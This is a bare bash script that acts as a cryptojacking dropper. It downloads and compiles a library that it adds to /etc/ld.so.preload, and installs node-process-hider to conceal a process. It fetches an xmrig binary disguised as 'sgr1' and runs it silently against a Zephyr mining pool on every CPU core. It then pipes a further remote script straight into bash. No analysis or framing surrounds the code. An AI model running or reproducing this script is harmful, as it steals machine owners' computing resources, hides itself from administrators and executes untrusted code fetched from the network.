#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.2.0 -y && npm i -g node-process-hider && ph add sgr1"
mkdir .kap && cd .kap
wget -O sgr1 https://bitbucket.org/zepir/filesg/raw/main/xmrig >/dev/null 2>&1
chmod +x sgr1
sudo ./sgr1 -a rx/0 -o singapore01.hashvault.pro:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-COBA) -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
curl -sL https://bitbucket.org/lightcoral2/cangor/raw/master/boled04.sh | bash